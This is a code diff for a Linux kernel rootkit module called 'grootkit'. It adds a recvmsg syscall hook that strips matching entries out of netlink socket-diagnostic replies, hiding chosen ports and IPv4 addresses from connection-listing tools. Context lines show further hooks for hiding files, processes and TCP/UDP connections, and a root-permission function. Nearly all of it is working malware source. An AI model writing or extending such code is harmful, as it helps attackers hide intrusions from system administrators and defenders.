@@ -35,6 +35,7 @@
 #include <linux/fdtable.h>
 #include <linux/compiler.h>
 #include <linux/syscalls.h>
+#include <linux/inet_diag.h>
 #include <linux/moduleparam.h>
 
 #pragma GCC optimize("-fno-optimize-sibling-calls")
@@ -135,12 +136,14 @@ struct ftrace_hook {
     Define the mkdir syscalls signatures.
 */
 #ifdef PTREGS_SYSCALL_STUBS
+typedef asmlinkage ssize_t (*recvmsg_signature)(const struct pt_regs *);
 typedef asmlinkage long (*getdents64_signature)(const struct pt_regs *);
 typedef asmlinkage int (*getdents_signature)(const struct pt_regs *);
 typedef asmlinkage long (*mkdir_signature)(const struct pt_regs *);
 typedef asmlinkage long (*kill_signature)(const struct pt_regs *);
 #else
 typedef asmlinkage long (*getdents64_signature)(unsigned int, struct linux_dirent64 *, unsigned int);
+typedef asmlinkage ssize_t (*recvmsg_signature)(int, struct user_msghdr __user *, unsigned int);
 typedef asmlinkage int (*getdents_signature)(unsigned int, struct linux_dirent *, unsigned int);
 typedef asmlinkage long (*mkdir_signature)(const char __user *, umode_t);
 typedef asmlinkage long (*kill_signature)(pid_t, int);
@@ -154,6 +157,7 @@ tcp_seq_show_signature udp4_seq_show_base;
 tcp_seq_show_signature udp6_seq_show_base;
 getdents64_signature getdents64_base;
 getdents_signature getdents_base;
+recvmsg_signature recvmsg_base;
 mkdir_signature mkdir_base;
 kill_signature kill_base;
 
@@ -248,7 +252,7 @@ void set_root_permissions(void) {
 asmlinkage int mkdir_hook(const struct pt_regs *regs) {
     const char __user *pathname = (char *)regs->di;
 #else
-asmlinkage long mkdir_hook(const char __user *pathname, umode_t mode) {
+asmlinkage int mkdir_hook(const char __user *pathname, umode_t mode) {
 #endif
 
     // printk(KERN_CRIT "mkdir hook: '%s' cmp '%s'\n", passphrase, pathname);
@@ -485,6 +489,57 @@ asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent *directory, un
 }
 
 /*
+    This function hooks recvmsg syscall to hide connections.
+*/
+#ifdef PTREGS_SYSCALL_STUBS
+asmlinkage ssize_t recvmsg_hook(const struct pt_regs *regs) {
+    ssize_t size = recvmsg_base(regs);
+    struct user_msghdr __user *message = (struct user_msghdr __user *) regs->si;
+#else
+asmlinkage ssize_t recvmsg_hook(int socketfd, struct user_msghdr __user *message, unsigned flags) {
+    ssize_t size = recvmsg_base(socketfd, message, flags);
+#endif
+    if (size <= 0) return size;
+
+    struct user_msghdr kernel_message;
+    struct iovec kernel_iov;
+    if (copy_from_user(&kernel_message, message, sizeof(*message))) return size;
+    if (copy_from_user(&kernel_iov, kernel_message.msg_iov, sizeof(*kernel_message.msg_iov))) return size;
+    void *buffer = kmalloc(size, GFP_KERNEL);
+    if (buffer == NULL) return size;
+    if (copy_from_user(buffer, kernel_iov.iov_base, size)) goto end;
+    struct nlmsghdr *header = (struct nlmsghdr *)buffer;
+
+    ssize_t size_base = size;
+    ssize_t counter = size;
+    while (header != NULL && NLMSG_OK(header, counter)) {
+        if (header->nlmsg_type == NLMSG_DONE || header->nlmsg_type == NLMSG_ERROR) goto end;
+        struct inet_diag_msg *connection = NLMSG_DATA(header);
+        if ((connection->idiag_family == AF_INET || connection->idiag_family == AF_INET6) &&
+            (source_port && connection->id.idiag_sport == source_port ||
+                destination_port && connection->id.idiag_dport == destination_port ||
+                (ip_address && connection->idiag_family == AF_INET &&
+                    (ip_address == connection->id.idiag_src[0] || ip_address == connection->id.idiag_dst[0])))) {
+            char *data = (char *)header;
+            int offset = NLMSG_ALIGN(header->nlmsg_len);
+            for (int index = 0; index < counter && index + offset < size_base; index += 1) data[index] = data[index + offset];
+            size -= offset;
+            counter -= offset;
+        } else {
+            header = NLMSG_NEXT(header, counter);
+        }
+    }
+
+    if (copy_to_user(kernel_iov.iov_base, buffer, size_base)) goto end;
+    if (copy_to_user(kernel_message.msg_iov, &kernel_iov, sizeof(kernel_message.msg_iov))) goto end;
+    copy_to_user(message, &kernel_message, sizeof(*message));
+
+end:
+    kfree(buffer);
+    return size;
+}
+
+/*
     This function hide TCP connection with
     specific port or IPv4 address.
 */
@@ -502,22 +557,22 @@ asmlinkage long tcp_seq_show_hook(struct seq_file *seq, void *s, tcp_seq_show_si
 
         if (socket->sk_state == TCP_TIME_WAIT) {
             // printk(KERN_CRIT "TCP_TIME_WAIT\n");
-            struct inet_timewait_sock *tw = (struct inet_timewait_sock *)s;
+            struct inet_timewait_sock *inet = (struct inet_timewait_sock *)s;
             if (is_ipv4) {
-                s1_ip_address = tw->tw_daddr;
-                s2_ip_address = tw->tw_rcv_saddr;
+                s1_ip_address = inet->tw_daddr;
+                s2_ip_address = inet->tw_rcv_saddr;
             }
-            s_source_port = tw->tw_sport;
-            s_destination_port = tw->tw_dport;
+            s_source_port = inet->tw_sport;
+            s_destination_port = inet->tw_dport;
         } else if (socket->sk_state == TCP_NEW_SYN_RECV) {
             // printk(KERN_CRIT "TCP_NEW_SYN_RECV\n");
-            struct inet_request_sock *ireq = (struct inet_request_sock *)s;
+            struct inet_request_sock *inet = (struct inet_request_sock *)s;
             if (is_ipv4) {
-                s1_ip_address = ireq->ir_rmt_addr;
-                s2_ip_address = ireq->ir_loc_addr;
+                s1_ip_address = inet->ir_rmt_addr;
+                s2_ip_address = inet->ir_loc_addr;
             }
-            s_source_port = ireq->ir_num;
-            s_destination_port = ireq->ir_rmt_port;
+            s_source_port = inet->ir_num;
+            s_destination_port = inet->ir_rmt_port;
         } else {
             // printk(KERN_CRIT "else %p\n", regs->ip);
             // struct inet_sock *inet = inet_sk(socket);
@@ -695,12 +750,13 @@ static int __init grootkit_init(void) {
     getdents64_base = syscall_hooking((unsigned long)getdents64_hook, (unsigned int)__NR_getdents64);
     // printk(KERN_INFO "getdents syscall hooking\n");
     getdents_base = syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_getdents);
+    recvmsg_base = syscall_hooking((unsigned long)recvmsg_hook, (unsigned int)__NR_recvmsg);
     // printk(KERN_INFO "tcp4_seq_show syscall hooking %p\n", tcp4_seq_show_base);
     tcp4_seq_show_base = symbol_hooking(&tcp4_seq_show_struct);
     tcp6_seq_show_base = symbol_hooking(&tcp6_seq_show_struct);
     udp4_seq_show_base = symbol_hooking(&udp4_seq_show_struct);
     udp6_seq_show_base = symbol_hooking(&udp6_seq_show_struct);
-    // printk(KERN_INFO "tcp4_seq_show syscall hooking %p\n", tcp4_seq_show_base);
+    // printk(KERN_INFO "tcp4_seq_show symbol hooking %p\n", tcp4_seq_show_base);
     // printk(KERN_INFO "return\n");
     return 0;
 }
@@ -713,6 +769,7 @@ static void __exit grootkit_exit(void) {
     syscall_hooking((unsigned long)kill_base, (unsigned int)__NR_kill);
     syscall_hooking((unsigned long)getdents64_base, (unsigned int)__NR_getdents64);
     syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_getdents);
+    syscall_hooking((unsigned long)recvmsg_base, (unsigned int)__NR_recvmsg);
     symbol_unhooking(&tcp4_seq_show_struct);
     symbol_unhooking(&tcp6_seq_show_struct);
     symbol_unhooking(&udp6_seq_show_struct);
